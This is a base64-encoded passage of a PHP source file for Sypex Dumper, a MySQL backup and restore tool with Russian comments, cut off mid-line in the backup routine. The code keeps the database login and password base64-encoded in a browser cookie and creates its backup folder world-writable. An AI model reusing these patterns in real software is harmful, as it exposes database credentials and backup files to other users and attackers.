IFBVUlBPU0UuICBTZWUgdGhlICAgICAgICAgICAgIHwKfCBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSAgICAgICAgIHwKfCBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZSAgICAgICAgICAgICAgIHwKfCBGb3VuZGF0aW9uLCBJbmMuLCA1OSBUZW1wbGUgUGxhY2UgLSBTdWl0ZSAzMzAsIEJvc3RvbiwgTUEgMDIxMTEtMTMwNyxVU0EuIHwKXCoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKi8KCi8vIHBhdGggYW5kIFVSTCB0byBiYWNrdXAgZmlsZXMKZGVmaW5lKCdQQVRIJywgJ2JhY2t1cC8nKTsKZGVmaW5lKCdVUkwnLCAgJ2JhY2t1cC8nKTsKLy8gTWF4IHRpbWUgZm9yIHRoaXMgc2NyaXB0IHdvcmsgKGluIHNlY29uZHMpCi8vIDAgLSBubyBsaW1pdApkZWZpbmUoJ1RJTUVfTElNSVQnLCA2MDApOwovLyDQntCz0YDQsNC90LjRh9C10L3QuNC1INGA0LDQt9C80LXRgNCwINC00LDQvdC90YvRhSDQtNC+0YHRgtCw0LLQsNC10LzRi9GFINC30LAg0L7QtNC90L4g0L7QsdGA0LDRidC10L3QuNGPINC6INCR0JQgKNCyINC80LXQs9Cw0LHQsNC50YLQsNGFKQovLyDQndGD0LbQvdC+INC00LvRjyDQvtCz0YDQsNC90LjRh9C10L3QuNGPINC60L7Qu9C40YfQtdGB0YLQstCwINC/0LDQvNGP0YLQuCDQv9C+0LbQuNGA0LDQtdC80L7QuSDRgdC10YDQstC10YDQvtC8INC/0YDQuCDQtNCw0LzQv9C1INC+0YfQtdC90Ywg0L7QsdGK0LXQvNC90YvRhSDRgtCw0LHQu9C40YYKZGVmaW5lKCdMSU1JVCcsIDEpOwovLyBteXNxbCBzZXJ2ZXIKZGVmaW5lKCdEQkhPU1QnLCAnbG9jYWxob3N0OjMzMDYnKTsKLy8gRGF0YWJhc2VzLiBJdCBpcyBuZWVkIGlmIHNlcnZlciBkb2VzIG5vdCBhbGxvdyBsaXN0IGRhdGFiYXNlIG5hbWVzCi8vIGFuZCBub3RoaW5nIHNob3dzIGFmdGVyIGxvZ2luLiAoc2VwYXJhdGVkIGJ5IGNvbW1hKQpkZWZpbmUoJ0RCTkFNRVMnLCAnJyk7Ci8vINCa0L7QtNC40YDQvtCy0LrQsCDRgdC+0LXQtNC40L3QtdC90LjRjyDRgSBNeVNRTAovLyBhdXRvIC0g0LDQstGC0L7QvNCw0YLQuNGH0LXRgdC60LjQuSDQstGL0LHQvtGAICjRg9GB0YLQsNC90LDQstC70LjQstCw0LXRgtGB0Y8g0LrQvtC00LjRgNC+0LLQutCwINGC0LDQsdC70LjRhtGLKSwgY3AxMjUxIC0gd2luZG93cy0xMjUxLCDQuCDRgi7Qvy4KZGVmaW5lKCdDSEFSU0VUJywgJ2F1dG8nKTsKLy8g0JrQvtC00LjRgNC+0LLQutCwINGB0L7QtdC00LjQvdC10L3QuNGPINGBIE15U1FMINC/0YDQuCDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC4Ci8vINCd0LAg0YHQu9GD0YfQsNC5INC/0LXRgNC10L3QvtGB0LAg0YHQviDRgdGC0LDRgNGL0YUg0LLQtdGA0YHQuNC5IE15U1FMICjQtNC+IDQuMSksINGDINC60L7RgtC+0YDRi9GFINC90LUg0YPQutCw0LfQsNC90LAg0LrQvtC00LjRgNC+0LLQutCwINGC0LDQsdC70LjRhiDQsiDQtNCw0LzQv9C1Ci8vINCf0YDQuCDQtNC+0LHQsNCy0LvQtdC90LjQuCAnZm9yY2VkLT4nLCDQuiDQv9GA0LjQvNC10YDRgyAnZm9yY2VkLT5jcDEyNTEnLCDQutC+0LTQuNGA0L7QstC60LAg0YLQsNCx0LvQuNGGINC/0YDQuCDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3QuNC4INCx0YPQtNC10YIg0L/RgNC40L3Rg9C00LjRgtC10LvRjNC90L4g0LfQsNC80LXQvdC10L3QsCDQvdCwIGNwMTI1MQovLyDQnNC+0LbQvdC+INGC0LDQutC20LUg0YPQutCw0LfRi9Cy0LDRgtGMINGB0YDQsNCy0L3QtdC90LjQtSDQvdGD0LbQvdC+0LUg0Log0L/RgNC40LzQtdGA0YMgJ2NwMTI1MV91a3JhaW5pYW5fY2knINC40LvQuCAnZm9yY2VkLT5jcDEyNTFfdWtyYWluaWFuX2NpJwpkZWZpbmUoJ1JFU1RPUkVfQ0hBUlNFVCcsICd1dGY4X2JpbicpOwovLyBzYXZlIHNldHRpbmdzIGFuZCBsYXN0IGFjdGlvbnMKLy8gMCAtIGRpc2FibGUsIDEgLSBlbmFibGUKZGVmaW5lKCdTQycsIDEpOwovLyBUYWJsZSB0eXBlcyBmb3Igc3RvcmUgc3RydWN0IG9ubHkgKHNlcGFyYXRlZCBieSBjb21tYSkKZGVmaW5lKCdPTkxZX0NSRUFURScsICdNUkdfTXlJU0FNLE1FUkdFLEhFQVAsTUVNT1JZJyk7Ci8vIEdsb2JhbCBzdGF0cwovLyAwIC0gZGlzYWJsZSwgMSAtIGVuYWJsZQpkZWZpbmUoJ0dTJywgMCk7CgovLyBFbmQgY29uZmlndXJhdGlvbiBibG9jayAtIHN0YXJ0IGNvZGUgYmxvY2sKJGR1bXBlcl9maWxlID0gYmFzZW5hbWUoX19GSUxFX18pOwoKJGlzX3NhZmVfbW9kZSA9IGluaV9nZXQoJ3NhZmVfbW9kZScpID09ICcxJyA/IDEgOiAwOwppZiAoISRpc19zYWZlX21vZGUgJiYgZnVuY3Rpb25fZXhpc3RzKCdzZXRfdGltZV9saW1pdCcpKSBzZXRfdGltZV9saW1pdChUSU1FX0xJTUlUKTsKCmhlYWRlcigiRXhwaXJlczogVHVlLCAxIEp1bCAyMDAzIDA1OjAwOjAwIEdNVCIpOwpoZWFkZXIoIkxhc3QtTW9kaWZpZWQ6ICIgLiBnbWRhdGUoIkQsIGQgTSBZIEg6aTpzIikgLiAiIEdNVCIpOwpoZWFkZXIoIkNhY2hlLUNvbnRyb2w6IG5vLXN0b3JlLCBuby1jYWNoZSwgbXVzdC1yZXZhbGlkYXRlIik7CmhlYWRlcigiUHJhZ21hOiBuby1jYWNoZSIpOwoKJHRpbWVyID0gYXJyYXlfc3VtKGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSkpOwpvYl9pbXBsaWNpdF9mbHVzaCgpOwplcnJvcl9yZXBvcnRpbmcoRV9BTEwpOwoKJGF1dGggPSAwOwokZXJyb3IgPSAnJzsKaWYgKCFlbXB0eSgkX1BPU1RbJ2xvZ2luJ10pICYmIGlzc2V0KCRfUE9TVFsncGFzcyddKSkgewogICAgICAgIGlmIChAbXlzcWxfY29ubmVjdChEQkhPU1QsICRfUE9TVFsnbG9naW4nXSwgJF9QT1NUWydwYXNzJ10pKXsKICAgICAgICAgICAgICAgIHNldGNvb2tpZSgic3hkIiwgYmFzZTY0X2VuY29kZSgiU0tEMTAxOnskX1BPU1RbJ2xvZ2luJ119OnskX1BPU1RbJ3Bhc3MnXX0iKSk7CiAgICAgICAgICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAkZHVtcGVyX2ZpbGUiKTsKICAgICAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAkZXJyb3IgPSAnIycgLiBteXNxbF9lcnJubygpIC4gJzogJyAuIG15c3FsX2Vycm9yKCk7CiAgICAgICAgfQp9CmVsc2VpZiAoIWVtcHR5KCRfQ09PS0lFWydzeGQnXSkpIHsKICAgICR1c2VyID0gZXhwbG9kZSgiOiIsIGJhc2U2NF9kZWNvZGUoJF9DT09LSUVbJ3N4ZCddKSk7CiAgICAgICAgaWYgKEBteXNxbF9jb25uZWN0KERCSE9TVCwgJHVzZXJbMV0sICR1c2VyWzJdKSl7CiAgICAgICAgICAgICAgICAkYXV0aCA9IDE7CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAkZXJyb3IgPSAnIycgLiBteXNxbF9lcnJubygpIC4gJzogJyAuIG15c3FsX2Vycm9yKCk7CiAgICAgICAgfQp9CgppZiAoISRhdXRoIHx8IChpc3NldCgkX1NFUlZFUlsnUVVFUllfU1RSSU5HJ10pICYmICRfU0VSVkVSWydRVUVSWV9TVFJJTkcnXSA9PSAncmVsb2FkJykpIHsKICAgICAgICBzZXRjb29raWUoInN4ZCIpOwogICAgICAgIGVjaG8gdHBsX3BhZ2UodHBsX2F1dGgoJGVycm9yID8gdHBsX2Vycm9yKCRlcnJvcikgOiAnJyksICI8U0NSSVBUPmlmIChqc0VuYWJsZWQpIHtkb2N1bWVudC53cml0ZSgnPElOUFVUIFRZUEU9c3VibWl0IFZBTFVFPUFwcGx5PicpO308L1NDUklQVD4iKTsKICAgICAgICBlY2hvICI8U0NSSVBUPmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lcicpLmlubmVySFRNTCA9ICciIC4gcm91bmQoYXJyYXlfc3VtKGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSkpIC0gJHRpbWVyLCA0KSAuICIgc2VjLic8L1NDUklQVD4iOwogICAgICAgIGV4aXQ7Cn0KaWYgKCFmaWxlX2V4aXN0cyhQQVRIKSAmJiAhJGlzX3NhZmVfbW9kZSkgewogICAgbWtkaXIoUEFUSCwgMDc3NykgfHwgdHJpZ2dlcl9lcnJvcigiQ2FuJ3QgY3JlYXRlIGRpciBmb3IgYmFja3VwIiwgRV9VU0VSX0VSUk9SKTsKfQoKJFNLID0gbmV3IGR1bXBlcigpOwpkZWZpbmUoJ0NfREVGQVVMVCcsIDEpOwpkZWZpbmUoJ0NfUkVTVUxUJywgMik7CmRlZmluZSgnQ19FUlJPUicsIDMpOwpkZWZpbmUoJ0NfV0FSTklORycsIDQpOwoKJGFjdGlvbiA9IGlzc2V0KCRfUkVRVUVTVFsnYWN0aW9uJ10pID8gJF9SRVFVRVNUWydhY3Rpb24nXSA6ICcnOwpzd2l0Y2goJGFjdGlvbil7CiAgICAgICAgY2FzZSAnYmFja3VwJzoKICAgICAgICAgICAgICAgICRTSy0+YmFja3VwKCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICBjYXNlICdyZXN0b3JlJzoKICAgICAgICAgICAgICAgICRTSy0+cmVzdG9yZSgpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICRTSy0+bWFpbigpOwp9CgpteXNxbF9jbG9zZSgpOwoKZWNobyAiPFNDUklQVD5kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGltZXInKS5pbm5lckhUTUwgPSAnIiAuIHJvdW5kKGFycmF5X3N1bShleHBsb2RlKCcgJywgbWljcm90aW1lKCkpKSAtICR0aW1lciwgNCkgLiAiIHNlYy4nPC9TQ1JJUFQ+IjsKCmNsYXNzIGR1bXBlciB7CiAgICAgICAgZnVuY3Rpb24gZHVtcGVyKCkgewogICAgICAgICAgICAgICAgaWYgKGZpbGVfZXhpc3RzKFBBVEggLiAiZHVtcGVyLmNmZy5waHAiKSkgewogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUoUEFUSCAuICJkdW1wZXIuY2ZnLnBocCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnbGFzdF9hY3Rpb24nXSA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfYmFja3VwJ10gPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsndGFibGVzJ10gPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsnY29tcF9tZXRob2QnXSA9IDI7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXSAgPSA3OwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWydsYXN0X2RiX3Jlc3RvcmUnXSA9ICcnOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPnRhYnMgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlY29yZHMgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPnNpemUgPSAwOwogICAgICAgICAgICAgICAgJHRoaXMtPmNvbXAgPSAwOwoKICAgICAgICAgICAgICAgIC8vINCS0LXRgNGB0LjRjyBNeVNRTCDQstC40LTQsCA0MDEwMQogICAgICAgICAgICAgICAgcHJlZ19tYXRjaCgiL14oXGQrKVwuKFxkKylcLihcZCspLyIsIG15c3FsX2dldF9zZXJ2ZXJfaW5mbygpLCAkbSk7CiAgICAgICAgICAgICAgICAkdGhpcy0+bXlzcWxfdmVyc2lvbiA9IHNwcmludGYoIiVkJTAyZCUwMmQiLCAkbVsxXSwgJG1bMl0sICRtWzNdKTsKCiAgICAgICAgICAgICAgICAkdGhpcy0+b25seV9jcmVhdGUgPSBleHBsb2RlKCcsJywgT05MWV9DUkVBVEUpOwogICAgICAgICAgICAgICAgJHRoaXMtPmZvcmNlZF9jaGFyc2V0ICA9IGZhbHNlOwogICAgICAgICAgICAgICAgJHRoaXMtPnJlc3RvcmVfY2hhcnNldCA9ICR0aGlzLT5yZXN0b3JlX2NvbGxhdGUgPSAnJzsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvXihmb3JjZWQtPik/KChbYS16MC05XSspKFxfXHcrKT8pJC8iLCBSRVNUT1JFX0NIQVJTRVQsICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Zm9yY2VkX2NoYXJzZXQgID0gJG1hdGNoZXNbMV0gPT0gJ2ZvcmNlZC0+JzsKICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnJlc3RvcmVfY2hhcnNldCA9ICRtYXRjaGVzWzNdOwogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cmVzdG9yZV9jb2xsYXRlID0gIWVtcHR5KCRtYXRjaGVzWzRdKSA/ICcgQ09MTEFURSAnIC4gJG1hdGNoZXNbMl0gOiAnJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIGJhY2t1cCgpIHsKICAgICAgICAgICAgICAgIGlmICghaXNzZXQoJF9QT1NUKSkgeyR0aGlzLT5tYWluKCk7fQogICAgICAgICAgICAgICAgc2V0X2Vycm9yX2hhbmRsZXIoIlNYRF9lcnJvckhhbmRsZXIiKTsKICAgICAgICAgICAgICAgICRidXR0b25zID0gIjxBIElEPXNhdmUgSFJFRj0nJyBTVFlMRT0nZGlzcGxheTogbm9uZTsnPkRvd25sb2FkIGZpbGU8L0E+ICZuYnNwOyA8SU5QVVQgSUQ9YmFjayBUWVBFPWJ1dHRvbiBWQUxVRT0nQmFjaycgRElTQUJMRUQgb25DbGljaz1cImhpc3RvcnkuYmFjaygpO1wiPiI7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9wYWdlKHRwbF9wcm9jZXNzKCJEQiBiYWNrdXAgaW4gcHJvZ3Jlc3MiKSwgJGJ1dHRvbnMpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfYWN0aW9uJ10gICAgID0gMDsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2xhc3RfZGJfYmFja3VwJ10gID0gaXNzZXQoJF9QT1NUWydkYl9iYWNrdXAnXSkgPyAkX1BPU1RbJ2RiX2JhY2t1cCddIDogJyc7CiAgICAgICAgICAgICAgICAkdGhpcy0+U0VUWyd0YWJsZXNfZXhjbHVkZSddICA9ICFlbXB0eSgkX1BPU1RbJ3RhYmxlcyddKSAmJiAkX1BPU1RbJ3RhYmxlcyddezB9ID09ICdeJyA/IDEgOiAwOwogICAgICAgICAgICAgICAgJHRoaXMtPlNFVFsndGFibGVzJ10gICAgICAgICAgPSBpc3NldCgkX1BPU1RbJ3RhYmxlcyddKSA/ICRfUE9TVFsndGFibGVzJ10gOiAnJzsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gICAgID0gaXNzZXQoJF9QT1NUWydjb21wX21ldGhvZCddKSA/IGludHZhbCgkX1BPU1RbJ2NvbXBfbWV0aG9kJ10pIDogMDsKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbGV2ZWwnXSAgICAgID0gaXNzZXQoJF9QT1NUWydjb21wX2xldmVsJ10pID8gaW50dmFsKCRfUE9TVFsnY29tcF9sZXZlbCddKSA6IDA7CiAgICAgICAgICAgICAgICAkdGhpcy0+Zm5fc2F2ZSgpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ3RhYmxlcyddICAgICAgICAgID0gZXhwbG9kZSgiLCIsICR0aGlzLT5TRVRbJ3RhYmxlcyddKTsKICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJF9QT1NUWyd0YWJsZXMnXSkpIHsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0aGlzLT5TRVRbJ3RhYmxlcyddIEFTICR0YWJsZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICR0YWJsZSA9IHByZWdfcmVwbGFjZSgiL1teXHcqP15dLyIsICIiLCAkdGFibGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gYXJyYXkoICIvXD8vIiwgIi9cKi8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVwbGFjZSA9IGFycmF5KCAiLiIsICIuKj8iKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGJsc1tdID0gcHJlZ19yZXBsYWNlKCRwYXR0ZXJuLCAkcmVwbGFjZSwgJHRhYmxlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ3RhYmxlc19leGNsdWRlJ10gPSAxOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U0VUWydjb21wX2xldmVsJ10gPT0gMCkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TRVRbJ2NvbXBfbWV0aG9kJ10gPSAwOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGRiID0gJHRoaXMtPlNFVFsnbGFzdF9kYl9iYWNrdXAnXTsKCiAgICAgICAgICAgICAgICBpZiAoISRkYikgewogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCLQntCo0JjQkdCa0JAhINCd0LUg0YPQutCw0LfQsNC90LAg0LHQsNC30LAg0LTQsNC90L3Ri9GFISIsIENfRVJST1IpOwogICAgICAgICAgICAgICAgICAgICAgICBlY2hvIHRwbF9lbmFibGVCYWNrKCk7CiAgICAgICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woIkNvbm5lY3Rpb24gdG8gREIgYHskZGJ9YC4iKTsKICAgICAgICAgICAgICAgIG15c3FsX3NlbGVjdF9kYigkZGIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC1INGD0LTQsNC10YLRgdGPINCy0YvQsdGA0LDRgtGMINCx0LDQt9GDINC00LDQvdC90YvRhS48QlI+IiAuIG15c3FsX2Vycm9yKCksIEVfVVNFUl9FUlJPUik7CiAgICAgICAgICAgICAgICAkdGFibGVzID0gYXJyYXkoKTsKICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNIT1cgVEFCTEVTIik7CiAgICAgICAgICAgICAgICAkYWxsID0gMDsKICAgICAgICB3aGlsZSgkcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXR1cyA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJHRibHMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoKCR0YmxzIEFTICR0YWJsZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4Y2x1ZGUgPSBwcmVnX21hdGNoKCIvXlxeLyIsICR0YWJsZSkgPyB0cnVlIDogZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkZXhjbHVkZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goIi9eeyR0YWJsZX0kL2kiLCAkcm93WzBdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzdGF0dXMgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGFsbCA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZXhjbHVkZSAmJiBwcmVnX21hdGNoKCIveyR0YWJsZX0kL2kiLCAkcm93WzBdKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3RhdHVzID0gLTE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXR1cyA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRzdGF0dXMgPj0gJGFsbCkgewogICAgICAgICAgICAgICAgICAgICAgICAkdGFibGVzW10gPSAkcm93WzBdOwogICAgICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgICAgICAgICAkdGFicyA9IGNvdW50KCR0YWJsZXMpOwogICAgICAgICAgICAgICAgLy8g0J7Qv9GA0LXQtNC10LvQtdC90LjQtSDRgNCw0LfQvNC10YDQvtCyINGC0LDQsdC70LjRhgogICAgICAgICAgICAgICAgJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCJTSE9XIFRBQkxFIFNUQVRVUyIpOwogICAgICAgICAgICAgICAgJHRhYmluZm8gPSBhcnJheSgpOwogICAgICAgICAgICAgICAgJHRhYl9jaGFyc2V0ID0gYXJyYXkoKTsKICAgICAgICAgICAgICAgICR0YWJfdHlwZSA9IGFycmF5KCk7CiAgICAgICAgICAgICAgICAkdGFiaW5mb1swXSA9IDA7CiAgICAgICAgICAgICAgICAkaW5mbyA9ICcnOwogICAgICAgICAgICAgICAgd2hpbGUoJGl0ZW0gPSBteXNxbF9mZXRjaF9hc3NvYygkcmVzdWx0KSl7CiAgICAgICAgICAgICAgICAgICAgICAgIC8vcHJpbnRfcigkaXRlbSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGluX2FycmF5KCRpdGVtWydOYW1lJ10sICR0YWJsZXMpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGl0ZW1bJ1Jvd3MnXSA9IGVtcHR5KCRpdGVtWydSb3dzJ10pID8gMCA6ICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYmluZm9bMF0gKz0gJGl0ZW1bJ1Jvd3MnXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFiaW5mb1skaXRlbVsnTmFtZSddXSA9ICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNpemUgKz0gJGl0ZW1bJ0RhdGFfbGVuZ3RoJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYnNpemVbJGl0ZW1bJ05hbWUnXV0gPSAxICsgcm91bmQoTElNSVQgKiAxMDQ4NTc2IC8gKCRpdGVtWydBdmdfcm93X2xlbmd0aCddICsgMSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpdGVtWydSb3dzJ10pICRpbmZvIC49ICJ8IiAuICRpdGVtWydSb3dzJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkaXRlbVsnQ29sbGF0aW9uJ10pICYmIHByZWdfbWF0Y2goIi9eKFthLXowLTldKylfL2kiLCAkaXRlbVsnQ29sbGF0aW9uJ10sICRtKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhYl9jaGFyc2V0WyRpdGVtWydOYW1lJ11dID0gJG1bMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YWJfdHlwZVskaXRlbVsnTmFtZSddXSA9IGlzc2V0KCRpdGVtWydFbmdpbmUnXSkgPyAkaXRlbVsnRW5naW5lJ10gOiAkaXRlbVsnVHlwZSddOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc2hvdyA9IDEwICsgJHRhYmluZm9bMF0gLyA1MDsKICAgICAgICAgICAgICAgICRpbmZvID0gJHRhYmluZm9bMF0gLiAkaW5mbzsKICAgICAgICAgICAgICAgICRuYW1lID0gJGRiIC4gJ18nIC4gZGF0ZSgiWS1tLWRfSC1pIik7CiAgICAgICAgJGZwID0gJHRoaXMtPmZuX29wZW4oJG5hbWUsICJ3Iik7CiAgICAgICAgICAgICAgICBlY2hvIHRwbF9sKCJDcmVhdGUgZmlsZSB3aXRoIGJhY2t1cCBvZiBEQjo8QlI+XFxuICAtICB7JHRoaXMtPmZpbGVuYW1lfSIpOwogICAgICAgICAgICAgICAgJHRoaXMtPmZuX3dyaXRlKCRmcCwgIiNTS0QxMDF8eyRkYn18eyR0YWJzfXwiIC4gZGF0ZSgiWS5tLmQgSDppOnMiKSAuInx7JGluZm99XG5cbiIpOwogICAgICAgICAgICAgICAgJHQ9MDsKICAgICAgICAgICAgICAgIGVjaG8gdHBsX2woc3RyX3JlcGVhdCgiLSIsIDYwKSk7CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gbXlzcWxfcXVlcnkoIlNFVCBTUUxfUVVPVEVfU0hPV19DUkVBVEUgPSAxIik7CiAgICAgICAgICAgICAgICAvLyDQmtC+0LTQuNGA0L7QstC60LAg0YHQvtC10LTQuNC90LXQvdC40Y8g0L/QviDRg9C80L7Qu9GH0LDQvdC40Y4KICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+bXlzcWxfdmVyc2lvbiA+IDQwMTAxICYmIENIQVJTRVQgIT0gJ2F1dG8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG15c3FsX3F1ZXJ5KCJTRVQgTkFNRVMgJyIgLiBDSEFSU0VUIC4gIiciKSBvciB0cmlnZ2VyX2Vycm9yICgi0J3QtdGD0LTQsNC10YLRgdGPINC40LfQvNC10L3QuNGC0Ywg0LrQvtC00LjRgNC+0LLQutGDINGB0L7QtdC00LjQvdC10L3QuNGPLjxCUj4iIC4gbXlzcWxfZXJyb3IoKSwgRV9VU0VSX0VSUk9SKTsKICAgICAgICAgICAgICAgICAgICAgICAgJGxhc3RfY2hhcnNldCA9IENIQVJTRVQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgICAgICAkbGFzdF9jaGFyc2V0ID0gJyc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHRhYmxlcyBBUyAkdGFibGUpewogICAgICAgICAgICAgICAgICAgICAgICAvLyDQktGL0YHRgtCw0LLQu9GP0LXQvCDQutC+0LTQuNGA0L7QstC60YMg0YHQvtC10LTQuNC90LXQvdC40Y8g0YHQvtC+0YLQstC10YLRgdGC0LLRg9GO0YnRg9GOINC60L7QtNC40YDQvtCy0LrQtSDRgtCw0LHQu9C40YbRiwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPm15c3FsX3ZlcnNpb24gPiA0MDEwMSAmJiAkdGFiX2NoYXJzZXRbJHRhYmxlXSAhPSAkbGFzdF9jaGFyc2V0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKENIQVJTRVQgPT0gJ2F1dG8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBteXNxbF9xdWVyeSgiU0VUIE5BTUVTICciIC4gJHRhYl9jaGFyc2V0WyR0YWJsZV0gLiAiJyIpIG9yIHRyaWdnZXJfZXJyb3IgKCLQndC10YPQtNCw0LXRgtGB0Y8g0LjQt9C8